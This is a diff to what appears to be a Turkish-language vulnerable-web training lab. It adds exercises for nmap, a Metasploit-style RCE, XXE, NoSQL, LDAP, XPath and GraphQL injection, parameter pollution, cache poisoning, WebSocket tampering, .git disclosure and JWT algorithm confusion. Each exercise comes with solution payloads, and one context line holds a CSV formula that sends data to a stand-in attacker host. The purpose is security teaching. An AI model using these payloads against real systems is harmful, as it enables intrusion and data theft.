@@ -322,6 +322,140 @@ const VULNS = [
     hints: ["İsim alanına = ile başlayan bir formül gir.", "Medium yalnız ='i nötrler; @ veya + dene."],
     solution: "Hedef /csv-injection. İsim olarak =HYPERLINK(\"http://atk/?d=\"&A1) (low) ya da @SUM(1+1)*cmd (medium, @ ile başla) ekle, 'CSV indir'e bak: hücre kaçırılmamışsa flag çıkar. High'da ' ön eki ile nötrlenir.",
   },
+  {
+    id: 28, slug: "nmap-recon", group: "modern", name: "Nmap — Servis Keşfi",
+    scenario: "Hedef sunucu birçok servis çalıştırır. Yaygın portlar dışında yüksek bir portta gizli bir servis vardır; tüm portları taramadan görünmez.",
+    levels: {
+      low: "Varsayılan tarama gizli yüksek portu (31337) da listeler → banner'daki flag hemen görünür.",
+      medium: "Varsayılan tarama yalnız yaygın portları gösterir; gizli port `-p-` (tüm portlar) veya doğrudan port=31337 ile bulunur.",
+      high: "Gizli servis firewall ile filtrelenir (filtered) → hiçbir tarama erişemez.",
+    },
+    hints: ["Gizli servis 31337 portunda; nmap'te tüm portlar `-p-` ile taranır.", "Sayfada 'tüm portları tara' kutusu = -p- ; ya da port=31337 dene."],
+    solution: "Hedef /nmap-recon. Gerçek nmap: nmap -p- <host> (tüm 65535 port). Low: varsayılan tarama 31337'yi gösterir. Medium: 'tüm portları tara'yı işaretle (ports=all) veya ?port=31337 → gizli servis banner'ında flag. High: 31337 'filtered' döner, flag yok.",
+  },
+  {
+    id: 29, slug: "metasploit-rce", group: "modern", name: "Metasploit — Servis Exploit (RCE)",
+    scenario: "Hedefte bilinen zafiyetli bir yönetim servisi (OrdekAdmin 1.0) var. Bir exploit modülü mantığıyla komut çalıştırıp (RCE) meterpreter oturumu açılır.",
+    levels: {
+      low: "Servis kimlik doğrulamasız komut çalıştırır → herhangi bir `cmd` gönder, RCE + flag.",
+      medium: "Zayıf bir yönetim token'ı kontrolü eklenmiş; ama varsayılan token banner'da sızıyor → `token` ile atla.",
+      high: "Servis yamalandı (girdi temizlenir / güçlü yetki) → 'target is not vulnerable', exploit başarısız.",
+    },
+    hints: ["GET ile servis banner'ını incele — sürüm ve varsayılan yönetim token'ı sızabilir.", "Medium'da exploit isteğine doğru token'ı ekle (msf'te 'set TOKEN ...')."],
+    solution: "Hedef /metasploit-rce. msf mantığı: use exploit/ordek/admin_rce; set RHOSTS <host>; set CMD id; (medium) set TOKEN VULNSOFT-DEFAULT; run. Low: {cmd:'id'} POST → meterpreter + flag. Medium: {cmd:'id', token:'VULNSOFT-DEFAULT'} (banner'dan sızan token). High: hangi cmd/token olursa olsun 'not vulnerable'.",
+  },
+
+  /* ───────────────────────── FAZ 2 — YENİ ZAFİYETLER ───────────────────────── */
+  {
+    id: 30, slug: "xxe", group: "core", name: "XXE — XML External Entity",
+    scenario: "Fatura içe-aktarma servisi XML gövdesini harici varlıkları çözerek ayrıştırır.",
+    levels: {
+      low: "DOCTYPE + ENTITY serbest; `file://` ile sunucu dosyaları okunur.",
+      medium: "'DOCTYPE' kelimesi naif (büyük/küçük harf duyarlı) filtrelenir — `doctype`/boşluk hilesiyle atlatılır.",
+      high: "Harici varlık çözümü kapalı (noent=false) — XXE çalışmaz.",
+    },
+    hints: ["Flag /tmp/xxe_flag.txt (veya /etc/passwd benzeri) içinde.", "Medium yalnız büyük harf 'DOCTYPE' arar; `<!doctype` veya araya boşluk koy."],
+    solution: "Hedef /xxe. Low: POST raw XML `<?xml version=\"1.0\"?><!DOCTYPE r [<!ENTITY x SYSTEM \"file:///tmp/xxe_flag.txt\">]><invoice><note>&x;</note></invoice>` → flag yansır. Medium: 'DOCTYPE' yerine '<!doctype' kullan. High: çalışmaz (entity kapalı).",
+  },
+  {
+    id: 31, slug: "nosql-injection", group: "core", name: "NoSQL Injection",
+    scenario: "Giriş API'si JSON gövdesini doğrudan Mongo-tarzı sorguya koyar.",
+    levels: {
+      low: "Operatör nesnesi serbest; `{\"$ne\":\"\"}` ile parola kontrolü atlanır.",
+      medium: "`$ne`/`$gt` kara listede ama `$regex` hâlâ açık.",
+      high: "Girdi string'e zorlanır; operatör enjeksiyonu çalışmaz.",
+    },
+    hints: ["Parola alanına string yerine bir operatör nesnesi gönder.", "Medium $ne'yi engeller; `{\"$regex\":\"^a\"}` ile parolayı karakter karakter çıkar ya da `^.*` ile eşle."],
+    solution: "Hedef /nosql. Low: `{\"username\":\"admin\",\"password\":{\"$ne\":\"\"}}` → admin girişi + flag. Medium: `{\"username\":\"admin\",\"password\":{\"$regex\":\"^.*\"}}`. High: reddedilir.",
+  },
+  {
+    id: 32, slug: "graphql-injection", group: "modern", name: "GraphQL Introspection & Injection",
+    scenario: "GraphQL endpoint'i; introspection ve yetkisiz alan erişimi seviyeye göre değişir.",
+    levels: {
+      low: "Introspection açık + `secretNote` alanı yetki kontrolsüz.",
+      medium: "Introspection açık ama `secretNote` 'internal' bayrağı ister — alias/derinlik ile sızdırılır.",
+      high: "Introspection kapalı + alan yetkilendirme zorunlu.",
+    },
+    hints: ["`{ __schema { types { name fields { name } } } }` ile şemayı keşfet.", "Gizli alan `user` tipinde; doğrudan `{ user(id:1){ secretNote } }` dene."],
+    solution: "Hedef /graphql. 1) Introspection: `{\"query\":\"{ __schema { queryType { fields { name } } } }\"}` → `secretNote` alanını gör. 2) `{\"query\":\"{ user(id:1){ username secretNote } }\"}` → flag secretNote'ta. High: introspection 'disabled' + alan reddedilir.",
+  },
+  {
+    id: 33, slug: "ldap-injection", group: "core", name: "LDAP Injection",
+    scenario: "Kurumsal giriş, kullanıcı girdisini LDAP arama filtresine birleştirir.",
+    levels: {
+      low: "Meta karakterler serbest; `*)(uid=*))(|(uid=*` ile filtre her-zaman-doğru olur.",
+      medium: "`*` filtrelenir ama `)(` ile mantık yine kırılır.",
+      high: "Girdi LDAP-kaçışlanır; enjeksiyon nötr.",
+    },
+    hints: ["LDAP filtresi `(&(uid=GİRDİ)(password=...))` biçiminde.", "Kullanıcı adına `admin)(&)` veya `*))%00` benzeri payload dene."],
+    solution: "Hedef /ldap. Low: username=`*)(uid=*))(|(uid=*`, password herhangi → filtre bypass + admin + flag. Medium: username=`admin)(&)`. High: engellenir.",
+  },
+  {
+    id: 34, slug: "xpath-injection", group: "core", name: "XPath Injection",
+    scenario: "Kullanıcılar XML'de tutulur; giriş XPath sorgusuyla doğrulanır.",
+    levels: {
+      low: "`' or '1'='1` ile XPath her-zaman-doğru olur.",
+      medium: "Tek tırnak filtrelenir; `\" or \"1\"=\"1` (çift tırnak) çalışır.",
+      high: "Parametrelendirilmiş XPath — enjeksiyon çalışmaz.",
+    },
+    hints: ["Sorgu `//user[username='GİRDİ' and password='...']` biçiminde.", "Yorum yerine mantık kullan: `' or '1'='1` veya `'] | //user[''='`."],
+    solution: "Hedef /xpath. Low: username=`admin' or '1'='1`, password=x → ilk kullanıcı (admin) döner + flag. Medium: çift tırnaklı varyant. High: reddedilir.",
+  },
+  {
+    id: 35, slug: "http-parameter-pollution", group: "modern", name: "HTTP Parameter Pollution",
+    scenario: "Para transferi onayı aynı parametreyi farklı katmanlarda farklı okur.",
+    levels: {
+      low: "Yetki kontrolü ilk `role` değerini, işlem son `role` değerini okur → çift gönderimle bypass.",
+      medium: "İki katman da aynı okur ama `amount[]` dizi vs string karışıklığı limitten kaçırır.",
+      high: "Tutarlı (son-değer) ayrıştırma; HPP nötr.",
+    },
+    hints: ["Aynı parametreyi iki kez gönder: `?role=user&role=admin`.", "İlk/son okuma farkını sömür; limit kontrolünü dizi ile şaşırt."],
+    solution: "Hedef /hpp. Low: `?role=user&role=admin&amount=100` → yetki 'user' görür (geçer), işlem 'admin' uygular → flag. Medium: `?amount=100&amount=999999`. High: engellenir.",
+  },
+  {
+    id: 36, slug: "web-cache-poisoning", group: "modern", name: "Web Cache Poisoning",
+    scenario: "Ana sayfa, önbelleğe alınırken anahtarsız bir başlığı (X-Forwarded-Host) yansıtır.",
+    levels: {
+      low: "Başlık doğrudan yansır ve önbelleğe yazılır → sonraki ziyaretçi zehirli yanıtı alır.",
+      medium: "Başlık değeri naif temizlenir ama `\"` kaçışı ile XSS yine enjekte edilir.",
+      high: "Başlık anahtarlanır/temizlenir → zehirlenme olmaz.",
+    },
+    hints: ["`X-Forwarded-Host: evil\"><script>...` gönder, sonra başlıksız iste — yanıt zehirli mi?", "Önbellek anahtarı yalnız yol; başlık unkeyed."],
+    solution: "Hedef /cache-poison. Low: `X-Forwarded-Host: x\"><img src=x onerror=alert(1)>` ile bir kez iste (zehirle) → ikinci (temiz) istek aynı zehirli HTML'i + flag döner. High: temizlenir.",
+  },
+  {
+    id: 37, slug: "websocket-tampering", group: "modern", name: "WebSocket Message Tampering",
+    scenario: "Canlı destek 'WebSocket' mesajlarındaki istemci-kontrollü role alanına güvenir.",
+    levels: {
+      low: "Mesaj JSON'undaki `role` alanı doğrudan yetki için kullanılır → admin yazıp yükselt.",
+      medium: "`role` kontrol edilir ama gizli `isStaff` bayrağı kontrol edilmez (mass-assign benzeri).",
+      high: "Rol sunucu oturumundan alınır; mesajdaki role yok sayılır.",
+    },
+    hints: ["Mesaj gövdesi JSON; sunucu `action` ve `role` okuyor.", "`getSecret` aksiyonu admin ister — mesaja `role:admin` ekle."],
+    solution: "Hedef /ws-chat (HTTP ile WS frame simülasyonu). Low: `{\"action\":\"getSecret\",\"role\":\"admin\"}` → flag. Medium: `{\"action\":\"getSecret\",\"isStaff\":true}`. High: reddedilir.",
+  },
+  {
+    id: 38, slug: "git-disclosure", group: "modern", name: ".git / Yedek Dosya İfşası",
+    scenario: "Dağıtımda .git klasörü ve config yedeği (.bak) siteye sızmıştır.",
+    levels: {
+      low: "`/.git/config`, `/.git/...`, `config.php.bak` doğrudan servis edilir → kaynak/sır okunur.",
+      medium: "`.git` engellenir ama `.bak`/`~`/`.swp` yedekleri hâlâ açık.",
+      high: "Tüm hassas uzantı/yol kalıpları engellenir (403).",
+    },
+    hints: ["Önce `/.git/config` ve `/.git/logs/HEAD` dene.", "Medium .git'i kapatır; `config.php.bak` veya `index.php~` dene."],
+    solution: "Hedef /git-disclosure. Low: `?path=/.git/config` ve `?path=/config.php.bak` → gömülü `DB_PASS`/flag. Medium: `?path=/config.php.bak`. High: hepsi 403.",
+  },
+  {
+    id: 39, slug: "jwt-alg-confusion", group: "auth", name: "JWT Algorithm Confusion (RS256→HS256)",
+    scenario: "API RS256 bekler ama doğrulayıcı token'ın alg başlığına körü körüne güvenir; public anahtar sızmıştır.",
+    levels: {
+      low: "Doğrulayıcı `alg`'ı token'dan alır → public anahtarı HMAC sırrı yapıp HS256 ile imzala.",
+      medium: "`alg:none` engellenir ama HS256-confusion hâlâ çalışır.",
+      high: "alg RS256'ya sabitlenir + HMAC reddedilir → confusion çalışmaz.",
+    },
+    hints: ["Public anahtar `/jwt-confusion?action=pubkey` ile sızıyor.", "Token'ı `HMAC-SHA256(public_key_pem)` ile imzala, payload'da role:admin."],
+    solution: "Hedef /jwt-confusion. 1) pubkey'i çek. 2) `{alg:HS256}` başlık + `{user:x,role:admin}` payload'ı public PEM'i sır alarak HMAC256 imzala. 3) POST {token} → admin + flag. High: reddedilir.",
+  },
 ];
 
 // Zafiyetleri zincirleyen örnek saldırı senaryoları (İlerleme ekranı)
